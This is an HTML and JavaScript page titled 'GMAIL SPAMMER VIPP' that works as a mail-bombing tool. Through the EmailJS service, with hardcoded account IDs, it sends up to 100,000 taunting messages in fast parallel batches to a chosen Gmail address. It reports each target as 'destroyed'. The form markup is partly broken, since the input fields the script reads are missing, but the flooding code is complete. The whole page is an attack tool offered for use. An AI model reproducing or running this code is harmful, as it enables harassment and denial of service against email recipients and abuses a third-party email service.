<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GMAIL SPAMMER VIPP</title>
    <link href="https://fonts.googleapis.com/css2?family=Eczar:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
        }

        .container {
            background: rgba(0, 0, 0, 0.95);
            border: 4px solid #ff0000;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 0 60px #ff0000;
            max-width: 700px;
            width: 95%;
            text-align: center;
            position: relative;
        }

        .title {
            color: #ff0000;
            font-size: 4em;
            font-weight: 700;
            text-shadow: 0 0 30px #ff0000, 0 0 60px #ff0000;
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 4px;
            font-family: 'Eczar', serif;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { text-shadow: 0 0 30px #ff0000, 0 0 60px #ff0000; }
            50% { text-shadow: 0 0 40px #ff0000, 0 0 80px #ff0000, 0 0 100px #ff0000; }
            100% { text-shadow: 0 0 30px #ff0000, 0 0 60px #ff0000; }
        }

        .credit {
            color: #ff0000;
            font-size: 1.3em;
            margin-bottom: 40px;
            text-shadow: 0 0 15px #ff0000;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            letter-spacing: 2px;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            color: #ff0000;
            margin-bottom: 8px;
            font-size: 1.1em;
            text-shadow: 0 0 10px #ff0000;
            font-family: 'Courier New', monospace;
            font-weight: bold;
        }

        input[type="email"],
        input[type="number"] {
            width: 100%;
            padding: 15px;
            border: 2px solid #ff0000;
            border-radius: 8px;
            background: #000000;
            color: #ff0000;
            font-size: 1.1em;
            box-shadow: 0 0 20px #ff0000;
            transition: all 0.3s ease;
            font-family: 'Courier New', monospace;
        }

        input[type="email"]:focus,
        input[type="number"]:focus {
            outline: none;
            box-shadow: 0 0 30px #ff0000;
            transform: scale(1.02);
        }

        .spam-btn {
            background: linear-gradient(45deg, #ff0000, #cc0000);
            color: #000000;
            border: none;
            padding: 20px 40px;
            font-size: 1.4em;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 0 30px #ff0000;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin: 25px 0;
            width: 100%;
            font-family: 'Eczar', serif;
        }

        .spam-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 50px #ff0000;
            background: linear-gradient(45deg, #ff3333, #ff0000);
        }

        .spam-btn:active {
            transform: scale(0.98);
        }

        .terminal {
            background: #000000;
            border: 2px solid #ff0000;
            border-radius: 8px;
            padding: 20px;
            margin-top: 25px;
            text-align: left;
            height: 350px;
            overflow-y: auto;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            box-shadow: inset 0 0 20px #ff0000;
        }

        .terminal-line {
            margin-bottom: 6px;
            animation: typewriter 0.1s ease-in;
            text-shadow: 0 0 5px #ff0000;
        }

        @keyframes typewriter {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .success { color: #00ff00; text-shadow: 0 0 5px #00ff00; }
        .error { color: #ff0000; text-shadow: 0 0 5px #ff0000; }
        .warning { color: #ffff00; text-shadow: 0 0 5px #ffff00; }
        .info { color: #00ffff; text-shadow: 0 0 5px #00ffff; }

        .flames {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
        }

        .flame {
            position: absolute;
            bottom: 0;
            background: linear-gradient(transparent, #ff0000);
            border-radius: 50% 50% 0 0;
            animation: burn 3s ease-in-out infinite;
        }

        @keyframes burn {
            0%, 100% { 
                opacity: 0.3;
                transform: scaleY(1);
            }
            50% { 
                opacity: 0.6;
                transform: scaleY(1.2);
            }
        }

        .glitch {
            position: relative;
            display: inline-block;
        }

        .glitch::before,
        .glitch::after {
            content: attr(data-text);
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }

        .glitch::before {
            animation: glitch-1 0.5s infinite linear alternate-reverse;
            color: #00ffff;
            z-index: -1;
        }

        .glitch::after {
            animation: glitch-2 0.5s infinite linear alternate-reverse;
            color: #ff00ff;
            z-index: -2;
        }

        @keyframes glitch-1 {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }

        @keyframes glitch-2 {
            0% { transform: translate(0); }
            20% { transform: translate(2px, 2px); }
            40% { transform: translate(2px, -2px); }
            60% { transform: translate(-2px, 2px); }
            80% { transform: translate(-2px, -2px); }
            100% { transform: translate(0); }
        }
    </style>
</head>
<body>
    <div class="flames" id="flames"></div>
    
    <div class="container">
        <h1 class="title glitch" data-text="GMAIL SPAMMER VIPP">GMAIL SPAMMER VIPP</h1>
        <div class="credit">üî• CREATED BY KANG DAFFA üî•</div>
        
        <form id="spamForm">

            <div class="form-group">

            <button type="submit" class="spam-btn">‚ö° START MASS SPAM ‚ö°</button>
        </form>
        
        <div class="terminal" id="terminal">
            <div class="terminal-line info">[SYSTEM] GMAIL SPAMMER VIPP ACTIVATED</div>
            <div class="terminal-line info">[SYSTEM] ULTRA FAST MODE ENABLED</div>

    </div>

    <!-- EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    
    <script>
        // Initialize EmailJS
        (function() {
            emailjs.init("H7WlzLgZwqVAqRG2M");
        })();

        // Create animated flames
        function createFlames() {
            const flamesContainer = document.getElementById('flames');
            for (let i = 0; i < 20; i++) {
                const flame = document.createElement('div');
                flame.className = 'flame';
                const width = Math.random() * 100 + 50;
                const height = Math.random() * 200 + 100;
                const left = Math.random() * 100;
                const delay = Math.random() * 3;
                
                flame.style.width = `${width}px`;
                flame.style.height = `${height}px`;
                flame.style.left = `${left}%`;
                flame.style.animationDelay = `${delay}s`;
                flame.style.opacity = Math.random() * 0.5 + 0.2;
                
                flamesContainer.appendChild(flame);
            }
        }

        // Email configuration
        const emailConfig = {
            serviceID: 'service_93wskl6',
            templateID: 'template_wtbthp2',  
            userID: 'H7WlzLgZwqVAqRG2M'
        };

        // ULTRA FAST email sending
        async function sendMassSpam(targetEmail, messageCount) {
            const terminal = document.getElementById('terminal');
            let successCount = 0;
            let failedCount = 0;
            
            const startLine = document.createElement('div');
            startLine.className = 'terminal-line warning';
            startLine.textContent = `[LAUNCH] MASS SPAM INITIATED: ${messageCount} messages to ${targetEmail}`;
            terminal.appendChild(startLine);

            // Send emails in parallel batches for maximum speed
            const batchSize = 5;
            const totalBatches = Math.ceil(messageCount / batchSize);
            
            for (let batch = 0; batch < totalBatches; batch++) {
                const batchPromises = [];
                const batchStart = batch * batchSize + 1;
                const batchEnd = Math.min((batch + 1) * batchSize, messageCount);
                
                // Create batch of email promises
                for (let i = batchStart; i <= batchEnd; i++) {
                    batchPromises.push(sendSingleSpam(targetEmail, i));
                }
                
                // Execute batch in parallel
                try {
                    const batchResults = await Promise.allSettled(batchPromises);
                    
                    // Process results
                    batchResults.forEach((result, index) => {
                        const messageNum = batchStart + index;
                        if (result.status === 'fulfilled' && result.value) {
                            successCount++;
                            if (successCount % 50 === 0 || successCount <= 10) {
                                const sentLine = document.createElement('div');
                                sentLine.className = 'terminal-line success';
                                sentLine.textContent = `[SPAMMED] ${targetEmail} - Message ${messageNum}: "YOUR GMAIL GOT SPAMMED BY @KANGDAFFA"`;
                                terminal.appendChild(sentLine);
                            }
                        } else {
                            failedCount++;
                        }
                    });
                    
                    // Progress update
                    if (batch % 10 === 0 || batch === totalBatches - 1) {
                        const progress = Math.round(((batch + 1) / totalBatches) * 100);
                        const progressLine = document.createElement('div');
                        progressLine.className = 'terminal-line info';
                        progressLine.textContent = `[PROGRESS] ${progress}% - ${successCount} sent, ${failedCount} failed`;
                        terminal.appendChild(progressLine);
                    }
                    
                    terminal.scrollTop = terminal.scrollHeight;
                    
                    // Minimal delay between batches
                    if (batch < totalBatches - 1) {
                        await new Promise(resolve => setTimeout(resolve, 100));
                    }
                    
                } catch (batchError) {
                    const errorLine = document.createElement('div');
                    errorLine.className = 'terminal-line error';
                    errorLine.textContent = `[BATCH ERROR] Batch ${batch + 1}: ${batchError.message}`;
                    terminal.appendChild(errorLine);
                }
            }
            
            return { success: successCount, failed: failedCount };
        }

        // Single email send function
        async function sendSingleSpam(targetEmail, messageNum) {
            try {
                const templateParams = {
                    to_email: targetEmail,
                    from_name: '@KANGDAFFA',
                    message: 'YOUR GMAIL GOT SPAMMED BY @KANGDAFFA',
                    subject: `SPAMMED BY @KANGDAFFA - ${messageNum}`,
                    reply_to: 'gojah58@gmail.com'
                };
                
                await emailjs.send(
                    emailConfig.serviceID, 
                    emailConfig.templateID, 
                    templateParams, 
                    emailConfig.userID
                );
                
                return true;
            } catch (error) {
                return false;
            }
        }

        // Form submission
        document.getElementById('spamForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const targetEmail = document.getElementById('email').value;
            const messageCount = parseInt(document.getElementById('count').value);
            const terminal = document.getElementById('terminal');
            const button = document.querySelector('.spam-btn');

            // Clear terminal
            terminal.innerHTML = `
                <div class="terminal-line info">[SYSTEM] GMAIL SPAMMER VIPP - MASS ATTACK MODE</div>
                <div class="terminal-line warning">[LAUNCH] Preparing to spam ${messageCount} messages...</div>
            `;

            // Validation
            if (!targetEmail.includes('@gmail.com')) {
                const errorLine = document.createElement('div');
                errorLine.className = 'terminal-line error';
                errorLine.textContent = '[ERROR] Target must be Gmail address';
                terminal.appendChild(errorLine);
                return;
            }

            if (messageCount > 100000 || messageCount < 1) {
                const errorLine = document.createElement('div');
                errorLine.className = 'terminal-line error';
                errorLine.textContent = '[ERROR] Count must be 1-100000';
                terminal.appendChild(errorLine);
                return;
            }

            // Disable button
            button.disabled = true;
            button.textContent = '‚ò†Ô∏è MASS SPAMMING IN PROGRESS...';
            button.style.background = 'linear-gradient(45deg, #666, #333)';

            // Start mass spam attack
            const startTime = Date.now();
            const result = await sendMassSpam(targetEmail, messageCount);
            const endTime = Date.now();
            const duration = ((endTime - startTime) / 1000).toFixed(1);

            // Re-enable button
            button.disabled = false;
            button.textContent = '‚ö° START MASS SPAM ‚ö°';
            button.style.background = 'linear-gradient(45deg, #ff0000, #cc0000)';

            // Final results
            const finalLine = document.createElement('div');
            finalLine.className = 'terminal-line success';
            finalLine.innerHTML = `
                [MISSION COMPLETE]<br>
                ‚úÖ ${result.success} messages sent successfully<br>
                ‚ùå ${result.failed} messages failed<br>
                ‚è±Ô∏è Total time: ${duration} seconds<br>
                üíÄ ${targetEmail} has been destroyed by @KANGDAFFA
            `;
            terminal.appendChild(finalLine);
            terminal.scrollTop = terminal.scrollHeight;

            // Celebration effect
            document.body.style.animation = 'none';
            setTimeout(() => {
                document.body.style.boxShadow = '0 0 200px #ff0000';
            }, 100);
        });

        // Initialize
        createFlames();
        
        // Add startup message
        setTimeout(() => {
            const terminal = document.getElementById('terminal');
            const readyLine = document.createElement('div');
            readyLine.className = 'terminal-line success';
            readyLine.textContent = '[READY] System armed - Maximum destruction enabled';
            terminal.appendChild(readyLine);
        }, 1500);
    </script>
</body>
</html>
